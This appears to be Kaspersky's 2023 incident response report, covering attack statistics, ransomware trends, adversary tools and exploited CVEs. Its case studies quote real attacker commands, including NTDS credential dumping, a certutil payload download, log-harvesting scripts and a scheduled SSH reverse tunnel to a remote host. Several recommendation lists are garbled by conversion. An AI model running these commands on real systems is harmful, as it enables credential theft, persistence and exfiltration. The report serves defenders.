# Kaspersky Incident Response Report 2023

## Table of Contents
- [Introduction](#introduction)
- [Trends in the 2023](#trends-in-the-2023)
- [Recommendations](#recommendations)
- [Attack duration](#attack-duration)
- [Why incident response is so critical](#why-incident-response-is-so-critical)
- [Initial vectors](#initial-vectors)
- [Tools and exploits](#tools-and-exploits)
- [MITRE ATT&CK tactics and techniques heatmap](#mitre-attck-tactics-and-techniques-heatmap)
- [About Kaspersky](#about-kaspersky)

---

## Introduction

This analyst report contains information about cyberattacks investigated by Kaspersky in 2023. Kaspersky provides a wide range of services — incident response, digital forensics, malware analysis, etc. — to help organizations affected by information security incidents. The data used in this report is derived from working with organizations that have sought assistance with responding to incidents or conducted professional events for their internal incident response teams. Incident investigation and response services are provided by Kaspersky’s Global Emergency Response Team (GERT) with experts in Europe, Asia, South and North America, the Middle East and Africa.

The report also includes data from experts in the Special Cyber Forces and Computer Incidents Investigation team, as well as the GReAT team.

The statistics helps us to identify trends relating to the most relevant threats to organizations across various sectors of the economy and regions. This enables us to develop priority protection methods and formulate recommendations which, when implemented, will help organizations enhance their security levels and prepare for incident response in the future, preventing or minimizing damage from potential attacks.

### Geography of IR service requests

![Figure 1: Geography of requests for Kaspersky Incident Response service in 2023](Figure 1)

Europe
9.09%

Americas
21.82%

Africa
7.27%

CIS
47.27%

ME
10.91%

APAC
3.64%

The geographic distribution of the service recently shifted somewhat, but the volume of inquiries in the Russian segment continues to grow. In 2023, there was a significant increase in service requests in the American region, which rose to the second place with 21.82% of requests.

![Figure 2: Top 3 attacked regions](Figure 2)

CIS
47.27%

Americas
21.82%

ME
10.91%

### Verticals and industries

![Figure 3: Distribution of requests for Kaspersky Incident Response service by industry](Figure 3)

Government
27.89%

Industrial
17.01%

Financial
12.24%

IT
8.84%

Telecom
4.76%

Retail
4.08%

Education
4.08%

Healthcare
3.40%

Transportation
2.72%

Mass Media
2.04%

Other
12.93%

![Figure 4: Top 3 attacked industries](Figure 4)

Government
27.89%

Industrial
17.01%

Financial
12.24%

## Trends in the 2023

Attacks through service providers were a notable trend in 2023. The increase in these attacks is not surprising — for attackers, this vector provides an opportunity to carry out a large-scale attack with significantly less effort than targeting individual victims. Detecting these attacks takes more time, as the actions of the attackers often closely resemble those of subcontractor employees. Half of these incidents were only discovered after a data leak was uncovered. A quarter of the victims were contacted after their data was encrypted, and one in four discovered the attack due to suspicious activity.

Another trend that has remained unchanged for the past few years is ransomware. In 2023, one in three incidents was related to ransomware. Although the share of these attacks decreased from 39.8% to 33.3% compared to the previous year, ransomware remains the primary threat to organizations in all sectors of the economy and in every industry.

In 2023, the ransomware we encountered most often were Lockbit (27.78%), BlackCat (12.96%), Phobos (9.26%), and Zeppelin (9.26%). Half of all attacks began with a publicly available application being compromised. Another 40% of attacks used compromised credentials (15% were obtained through brute force attacks). The remaining 10% were divided evenly between phishing and attacks through trusted relationships. Most of the data encryption attacks ended within a day (43.48%) or days (32.61%). The rest lasted for weeks (13.04%) and only 10.87% lasted for more than a month. Almost all the long ransomware attacks that lasted weeks and months, besides data encryption, also involved data leakage.

### Adversary’s tools

Adversaries continue to use many different utilities, but Mimikatz and PsExec remain the most popular tools, used in 15.58% and 13.64% of incidents respectively.

One in three incidents is associated with ransomware

The most popular tools used by adversaries

Mimikatz
15.58%

PsExec
13.64%

### Attack impact

Data encryption remains the main problem for attacked companies, and although the share of companies affected by ransomware decreased slightly in 2023, a third of businesses that applied for the IR service lost data due to encryption. At the same time, the share of companies facing data leaks increased to 21.1%. It’s also worth noting that data leaks are often accompanied by subsequent encryption of the victim's infrastructure.

Primary issues: encryption and data leaks

## Overview and recommendations

### Getting in

1.  Reconnaissance
2.  Resource development
3.  Delivery
4.  Social engineering
5.  Exploitation
6.  Persistence
7.  Defense evasion
8.  Command & Control
9.  Pivoting
10. Discovery
11. Privilege escalation
12. Execution
13. Credential access
14. Lateral movement

### Taking it out

15. Collection
16. Exfiltration
17. Impact
18. Objectives

Exploit of a public-facing application
42.37%

Compromised accounts
20.34%

Brute Force
8.47%

Trusted relationship
6.78%

multifactor authentication

### Recommendations
*   Implement a robust password policy and
*   Remove management ports from public
*   Establish a zero-tolerance policy for patch

access

management or compensation measures for
public-facing applications

*   Ensure that employees maintain

a high level of security

We discovered usage of legitimate tools in almost every second case in 2023

Mimikatz
15.58%

PsExec
13.64%

Advanced IP Scanner
9.09%

SoftPerfect Network Scanner
7.14%

AnyDesk
5.19%

CobaltStrike
5.19%

PowerShell
5.19%

7zip
3.90%

### Tools used by adversaries

### Recommendations
*   Implement rules for the detection of pervasive
*   Employ a security tool stack with EDR like
*   Constantly test reaction times of security
*   Eliminate usage of software from the

operations with offensive exercises

telemetry

partner to address incidents with fast SLAs

### Recommendations
*   Back up your data
*   Work with an Incident Response Retainer
*   Implement strict security programs for
*   Implement security access control over
*   Continually train your incident response team

important data with DLP

applications with PII

to maintain their expertise and stay up to
speed with the changing threat landscape

### Organization’s maturity

Looking at the reasons for Kaspersky Incident Response service requests in more detail, we can divide them into two groups.

**Group I** (reasons and impact were already known at the time of the request)
These victims typically become aware of an attack when it has already occurred and the damage is evident.

**Group II** (attacks with indicators of suspicious activity)
Based on the results of our analysis, these suspicious activities had the following impacts:

Files encrypted
33.33%

Data leakage
21.09%

Money theft
1.36%

Defacement
1.36%

Service unavailable
1.36%

Active Directory compromised
12.24%

Persistence installed for future impact
10.88%

False alarm
7.48%

Data manipulation
4.08%

Account Takeover
2.72%

Attack prevented or not finished
1.36%

42.2% of all requests based on suspicious indicators such as:

User activity
Security tools alerts
Files and emails
Network activity

Of course, some of these incidents could also potentially escalate into incidents with a heavier impact, and detection at an earlier stage of attack helps to reduce the impact.

## Attack duration

All incident cases can be grouped into three categories with different adversary dwell times, incident response duration, initial access, and attack impact.

| Category      | Rush (Hours and days) | Average (Weeks) | Long lasting (A month or more) |
| :------------ | :-------------------- | :-------------- | :----------------------------- |
| Percentage of attacks | 69.75%                | 8.40%           | 21.85%                         |
| Average attack duration | < 1 day               | 15 days         | 135 days                       |
| Representative impact | Ransomware            | Ransomware and money theft | Data leakage and ransomware    |
| Initial attack vector | Public-facing applications, Compromised accounts | Public-facing applications | Public-facing applications, Trusted relationships |
| Incident response duration | Attacks that lasted up to a week. Major high-velocity ransomware attacks that present the biggest challenge even to mature security operations. Mostly noisy adversary behavior building up on low hanging fruit, publicly available and easily identifiable security issues | Attacks that lasted up to a month. Due to ransomware, a lot of attacks are indistinguishable from faster ones (Rush). Many cases in this group have a significant time period between initial access and subsequent stages of the attack | Attacks that lasted more than a month. Irregular periods of active and passive phases during the attack. The duration of active phases is very similar to the previous (Average) group |

### Reasons for requesting the service

**True positives**
Encrypted files
43.22%

Data leakage
18.18%

Suspicious files
9.09%

Suspicious user activity
72.73%

Security tools alerts
18.18%

Non-authorized accesses
9.09%

Money theft
11.86%

Suspicious network activity
4.24%

Service unavailable
3.39%

Suspicious emails
2.54%

**False alarms** (7.4 % of all service requests)
Suspicious user activity
16.10%

Suspicious network activity
13.56%

Security tools alerts
4.69%

Encrypted files were the top reason for service requests across all regions and industries, suggesting that encryptors represented the most common cyberthreat during 2023. Suspicious activity was the second most common cause of requests, and also accounted for the most false reports.

![Figure 5: Reasons for requests of Kaspersky Incident Response service by region](Figure 5)

CIS
53.13%

ME
23.44%

APAC
17.19%

Americas
15.63%

Europe
12.50%

Africa
7.81%

Data leakage
4.69%

Service unavailable
3.13%

Files encrypted
3.13%

Suspicious activity
4.69%

Money theft
1.56%

Suspicious e-mail message
3.13%

Security tool alert
1.56%

Unauthorized access
1.56%

## Initial attack vector

In 2023, the most common method of initial compromise remains public-facing applications. We found that a third of these applications were attacked through known vulnerabilities. It’s also noteworthy that over half of these vulnerabilities were vulnerabilities discovered in 2021 and 2022. This initial vector was found in 42.37% of cases. Most often, these attacks lasted less than a day (in 18.64% of all incidents). The reason for the request was already encrypted data in 5% of cases, and suspicious activity in 10% of cases.

| Initial Attack Vector | Percentage | Duration | Reason for Request |
| :-------------------- | :--------- | :------- | :----------------- |
| Exploit Public-Facing Application | 42.37%     | < 1 day (18.64%) | Encrypted data (5%), Suspicious activity (10%) |
| Valid Accounts        | 20.34%     | < 1 day (15.25%), < 1 week (8.47%) | Encrypted data (14.06%), Suspicious activity (6.25%) |
| BruteForce            | 8.47%      |        |                    |
| Trusted Relationship  | 6.78%      | > 1 month (half) |                    |
| Phishing              | 1.69%      |        |                    |
| Insider               | 1.69%      |        |                    |
| Other                 | 3.39%      |        |                    |

There have been compromises through trusted relationships before, but this year, their share increased significantly, amounting to 6.78% of compromises. This approach allows adversaries to gain access to dozens of victims through a single hacked organization. In this situation, additional difficulties may arise for the investigative team, since not all organizations that are the initial source of the attack understand the need for a full-scale investigation, and may be unwilling to cooperate. With this method of penetration, adversaries sometimes need more time from the beginning of the attack to the final phase, so half of these attacks lasted more than a month.

## Tools and exploits

In 39.18% of all investigated attacks, evidence of the use of legitimate utilities by adversaries was found.

These utilities include the so-called LOLBins¹ (utilities that already exist on attacked machines, such as operating system components, etc.), utilities of information security specialists from the Red Team, PenTest teams, as well as commercial frameworks (Cobalt Strike, Metasploit, Acunetix).

### Distribution and frequency of tools used in incidents

**Frequent, 20–25%**
*   Mimikatz
*   PsExec

**Average, 8–15%**
*   SoftPerfect Network Scanner
*   7zip
*   Metasploit
*   PowerShell
*   Cobalt Strike
*   SystemBC
*   BloodHound
*   AnyDesk
*   Advanced IP Scanner
*   DiskCryptor
*   MEGASync

**Rare, 1–8%**
*   Mimikatz
*   PsExec
*   SoftPerfect Network Scanner
*   7zip
*   Metasploit
*   PowerShell
*   Cobalt Strike
*   SystemBC
*   BloodHound
*   AnyDesk
*   Advanced IP Scanner
*   DiskCryptor
*   MEGASync

Specialized frameworks such as Cobalt Strike and PowerShell scripts are quite popular with adversaries, but Mimikatz and PsExec remain the most commonly used tools.

| MITRE ATT&CK Tactic | Percentage | Tools |
| :------------------ | :--------- | :---- |
| Command and Control | 25.58%     | AnyDesk, SystemBC, Revsocks, gs-netcat, Proxifier, dchelp, Earthworm, Remote Desktop, SSH, WebShell, Custom Linux bot |
| Discovery           | 20.93%     | Advanced IP Scanner, SoftPerfect Network Scanner, BloodHound, Fscan, Acunetix, Angry IP Scanner, Nbtscan, Nessus, netscan.exe |
| Execution           | 20.93%     | PsExec, PowerShell, WMIC, PowerTool x64, WMI Exec, DarkKomet, ASPXspy2, MARIJUANA |
| Lateral Movement    | 11.63%     | Cobalt Strike, Metasploit, Impacket, CrackMapExec, Meterpreter |
| Impact              | 4.65%      | DiskCryptor, MHDDoS |
| Privilege Escalation| 4.65%      | Mimikatz, EfsPotato |
| Collection          | 4.65%      | 7zip, Adminer, MEGASync, PhishingKit, MetaStealer |
| Credential Access   | 2.33%      | Mimikatz |
| Initial Access      | 2.33%      | Mimikatz |

### Legitimate tools in MITRE ATT&CK

In most cases, security teams can mitigate the initial vector of attack with prevention solutions. The most prevalent vectors of attack (exploitation of public-facing applications, compromised accounts, malicious e-mail) could have been mitigated with timely patch management and implementation of multifactor authentication, solutions with anti-phishing software to defend against phishing attacks, and implementation of security awareness training for employees.

Even with these measures in place, attacks can still occur, and it’s important to try to detect traces of an attack’s development as soon as possible.

The growing abuse of legitimate tools for persistence and command and control can be managed by implementing security controls capable of detecting unauthorized installations or tool execution (no matter if it’s malware). Also, Managed Detection and Response can protect against new tactics abusing different tools for execution, access or enumeration and provide recommendations based on the risk.

#### Domain takeover and ransomware

Ransomware groups reused previously identified strategies for intrusion using similar tools². Adversaries exploited Internet-facing applications that implemented vulnerable modules for RCE (Remote Command Execution). This is how ransomware groups targeted public services supported by vulnerable versions of log4j and directed their arsenal to exploit vulnerabilities and compromise infrastructures.

Exploit Public-Facing Application T0819
`/Program Files/<VulnerableApp>/root/WEB-INF/lib/log4j-1.2.17.jar`

After confirmed exploitation, the adversary modified the local privileged account responsible for app execution. The adversary executed commands locally to modify the user’s password.

Account Manipulation T1098
`Net user <username> <new_password>`

Then, the adversary uploaded a set of tools to the system:
`C:\Users\<username>\Documents\netscanold.exe`
`C:\Users\<username>\Documents\mimikatz\x64\mimikatz.exe`

The adversary then executed Meterpreter on the system and gained additional access and persistence.

Create or Modify System Process: Windows Service T1543:003
`Svc: ghhjbl ¦ Path: cmd.exe /c echo ghhjbl > \\.\pipe\ghhjbl`

Finally, once they confirmed full access, the adversary installed the application eHours for persistence and C2.

Remote Access Software T1219
`C:\Program Files\ehorus_agent\ehorus_uit.exe`
`C:\Program Files\ehorus_agent\ehorus_cmd.exe`
`C:\Program Files\ehorus_agent\ehorus_launcher.exe`

#### Public-facing exploitation and ransomware attack

BloodHound and Impacket are well-known security tools for lateral movement and discovery. They take advantage of network protocols to collect information and reuse sessions to execute remote commands or obtain usernames and credentials, but most of their payloads or scripts are detected by endpoint controls.

Adversaries decided to use a different technique that abuses the Command and Scripting Interpreter: Windows Command Shell to collect evtx files locally on critical systems, and then compressed the files and moved it to a pivot system. Once the files were moved, a new script was used to extract valid usernames based on 4624 events.

Log Enumeration T1654, Command and Scripting Interpreter: Windows Command Shell T1059:003
`Copy the file to the public folder:`
`copy $system32\winevt\Logs\Security.evtx $public\Security.evtx`

`Compress the copied file and prepare it to move to a pivot system:`
`Add-Type -A System.IO.Compression.FileSystem;;$zipFile = [System.IO.Compression.ZipFile]::Open('c:\users\public\Security.zip', 'Update');[System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipfile,'c:\users\public\Security.evtx','Security.evtx');$zipFile.Dispose()`

`Script to extract valid usernames from the evtx logs:`
`Get-Eventlog -LogName Security | where {$.eventID -eq 4624 } | % {$.ReplacementStrings[6] + ";" + $.ReplacementStrings[5] + ";" + $.ReplacementStrings[11]} | Export-csv guli_<Local_server>.csv -encoding utf8`

`Get-WinEvent -Path C:\users\public\Security_<server1>.evtx | where {$.ID -eq 4624 } | Select -Property @{N='Domain'; E={$.Properties[6].value}},@{N='User'; E={$.Properties[5].value}},@{N='IP'; E={$.Properties[18].value}} | Export-csv C:\users\public\guli_<server1>.csv -encoding utf8`

The native SSH.exe command for Windows and its modules can be used for Command and Control and to exfiltrate information using the same connection channel. Adversaries identify the path to reach remote systems where critical systems allow Internet access and, once they confirm access, can use multiple commands to configure an SSH Backdoor to send and receive data.

Protocol Tunneling T1572, Scheduled Task/Job T1053
`Identifying internet access:`
`ping <remote_IP>`
`ping <second_remote_IP>`

`Get the public SSH host keys for the C2 system:`
`ssh-keyscan -p 443 <remoteIP>`

`Configure local ssh keys and grant permissions:`
`ssh-keygen -f <path>/.ssh/id_rsa -t rsa -N "<passphrase>"`
`icacls <path>/.ssh/id_rsa /inheritance:r`
`icacls <path>/.ssh/id_rsa /grant:r "%username%":"(R)"`
`icacls <path>/.ssh/sshd_config /inheritance:r`
`icacls <path>/.ssh/sshd_config /grant:r "%username%":"(R)"`

`Configure tasks to be executed every minute “SSH Server” and “SSH Key Exchange” configuring an Reverse Tunneling:`
`schtasks.exe /create /sc minute /mo 1 /tn "SSH Server" /rl highest /np /tr "<path>\sshd\sshd.exe -f <path>/.ssh/sshd_config"`
`schtasks.exe /create /sc minute /mo 1 /tn "SSH Key Exchange" /rl highest /np /tr <path>\sshd\ssh.exe -i <path>\.ssh\id_rsa -N -R 22443:127.0.0.1:2222 -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=15 root@<remoteIP> -p 443`

`ssh-keyscan` is a utility for gathering the public SSH host keys of hosts. It was designed to aid in building and verifying `ssh_known_hosts` files³.

#### Flax Typhoon

While analyzing an incident, several techniques were detected for installation and execution using legitimate software and LOLBins. Flax Typhon, an APT targeting Taiwanese organization, was confirmed. The initial activity performed by the threat actor was a malicious PowerShell script executed by the adversary to dump credentials.

OS Credential Dumping: NTDS — T1003:003, Event Triggered Execution: PowerShell Profile — T1546:013
`cmd /c ntdsutil "ac i ntds" ifm "create full c:\PerfLogs\test" q q c:\windows\sysvol\domain\ntds\active directory\ntds.dit"`

Certutil, a Windows command, was used to download and execute the file conhost.

Ingress Tool Transfer — T1105
`certutil.exe -urlcache -split -f http://<edited>/conhost.exe`

A new suspicious service was found masquerading as a Windows Update service and linked to the recently downloaded file.

System Services: Service Execution — T1569:002
`HKLM\SYSTEM\ControlSet001\Services\Windos_update`
`"C:\windows\temp\Crashpad\conhost.exe" /service`

The detected file was confirmed as a legitimate VPN client implemented to avoid detection/network filtering and/or enable access.

Protocol Tunneling — T1572
`C:\windows\temp\Crashpad\conhost.exe`
File Description: SoftEther VPN
Original filename: vpnbridge.exe

A second service was identified on the system, named as WorkService. The corresponding dll, related to a Zabbix agent, was detected.

Remote Access Software T1219
Registry key: `HKLM\SYSTEM\ControlSet001\Services\WorkService`
ImagePath: `"C:\Windows\TAPI\dllhost.exe" --config "C:\Windows\TAPI\wshelper.dll"`
Original filename: `zabbix_agentd.exe`
Company: Zabbix SIA

### The most common vulnerabilities

The most prevalent vulnerabilities present in our dataset for 2023 were related to SMBv1 (CVE-2017-0144, and CVE-2017-0143), Microsoft Exchange Server (CVE-2021-27065, and CVE-2021-26855) and FortiOS (CVE-2023-22640, and CVE-2023-25610).

62% of the vulnerabilities we detected in attacks lead to Remote Code Execution (RCE), most of them with public exploits available on the surface web, which makes it easy for adversaries to exploit them and gain access to the target system. (ITW)

By analyzing the root cause of the vulnerabilities, we know that the most prevalent Common Weakness Enumeration category is CWE-20 (Improper Input Validation). This reveals that a lot of programs do not use basic secure coding techniques (like input sanitization/validation). To avoid this type of problem, developers should adopt the best secure coding practices in their products. Customers also need to ensure regular updates to get the latest security patches to mitigate such issues.

| Vulnerability Name | CVE ID | CVSS Score | CWE | ITW | Vulnerability Type | Description |
| :----------------- | :----- | :--------- | :-- | :-- | :----------------- | :---------- |
| OpenSSH (ssh_agent) | CVE-2023-38408 | 9.8 CRITICAL | CWE-428 | Yes | Remote Code Execution | Due to an insufficiently trustworthy search path in the PKCS#11 feature in ssh-agent, this vulnerability can lead to remote code execution if an agent is forwarded to an adversary-controlled system. |
| Windows (SMBv1) | CVE-2017-0144 | 8.1 HIGH | CWE-20 | Yes | Remote Code Execution | This old vulnerability known as EternalBlue in SMBv1 server allows remote adversaries to execute arbitrary code via crafted packets. |
| Bitrix Site Manager | CVE-2022-27228 | 9.8 CRITICAL | CWE-20 | Yes | Remote Code Execution | Insufficient validation of user input allows a remote unauthenticated adversary to execute arbitrary code on Bitrix Site Manager. |
| Veeam Backup & Replication | CVE-2023-27532 | 7.5 HIGH | CWE-306 | Yes | Missing Authentication | Allows the theft of encrypted credentials stored in the configuration database of Veeam Backup & Replication, leaking of plaintext credentials or carrying out remote command execution. |
| Microsoft Exchange Server | CVE-2021-27065 | 7.8 HIGH | CWE-22 | Yes | Remote Code Execution | This vulnerability is known as ProxyLogon allows an adversary to execute arbitrary commands on the remote Microsoft Exchange server. |
| Microsoft Exchange Server | CVE-2021-26855 | 9.8 CRITICAL | CWE-918 | Yes | Remote Code Execution | This vulnerability, also known as ProxyLogon, is a server-side request forgery (SSRF) vulnerability in Exchange that lets an adversary to send arbitrary HTTP requests and authenticate as the Exchange server, allowing remote code execution on the remote Microsoft Exchange server. |
| Windows (SMBv1) | CVE-2017-0143 | 8.1 HIGH | CWE-20 | Yes | Remote Code Execution | This vulnerability in SMBv1 server allows a remote adversary to execute arbitrary code via crafted packets. |
| FortiOS | CVE-2023-22640 | 8.8 HIGH | CWE-787 |  | Memory Corruption | This vulnerability in FortiOS allows an authenticated adversary to execute unauthorized code via crafted requests. |
| FortiGate | CVE-2022-42469 | 4.3 MEDIUM | CWE-183 |  | Improper Access Control | A permissive list of allowed inputs in certain FortiGate versions may allow an authenticated adversary to bypass the policy via bookmarks in the web portal. |
| FortiOS | CVE-2023-25610 | 9.3 CRITICAL | CWE-20 | Yes | Remote Code Execution | A buffer underwrite vulnerability present in FortiOS allows a remote unauthenticated adversary to execute arbitrary code on the target device. This vulnerability may also lead to a DoS via crafted requests. |
| Apache Log4j | CVE-2021-4104 | 7.5 HIGH | CWE-502 |  | Remote Code Execution | JMSAppender in Log4j 1.2 is vulnerable to insecure deserialization, which results in remote code execution if JMSAppender is set to perform JNDI requests. |
| Oracle Web Applications Desktop Integrator | CVE-2022-21587 | 9.8 CRITICAL | CWE-434 | Yes | Unrestricted File Upload | Allows an unauthenticated adversary with network access via HTTP to compromise Oracle Web Applications Desktop Integrator, which can result in the takeover of the application. |
| Windows Common Log File System (CLFS) | CVE-2022-37969 | 7.8 HIGH | CWE-269 | Yes | Privilege Escalation | Allows an adversary to gain system privileges by exploiting the Windows Common Log File System Driver. |

## MITRE ATT&CK tactics and techniques heatmap

![MITRE ATT&CK tactics and techniques heatmap](MITRE ATT&CK tactics and techniques heatmap)

## About Kaspersky

Kaspersky is a global cybersecurity and digital privacy company founded in 1997. Our deep threat intelligence and security expertise is constantly transforming into innovative security solutions and services to protect businesses, critical infrastructure, governments and consumers around the globe. Our comprehensive security portfolio includes leading endpoint protection and specialized security solutions and services to fight sophisticated and evolving digital threats.

### Cybersecurity services

### Global recognition

Kaspersky products and solutions undergo constant independent testing and reviews, routinely achieving top results, recognition and awards. Our technologies and processes are regularly assessed and verified by the world's most respected analyst organizations. Most tested. Most awarded.

Learn more

5000+
professionals work at
Kaspersky

50%
of employees are R&D
specialists

5
unique centers of
excellence

410 k +
new malicious files
detected by Kaspersky
every day

220 k +
corporate customers
worldwide

6.1 bln
cyberattacks were
detected by our solutions
in 2023

---
Analyst report

Incident
Response

12023

www.kaspersky.com

© 2024 AO Kaspersky Lab. Registered trademarks and
service marks are the property of their respective owners.

#kaspersky
#bringonthefuture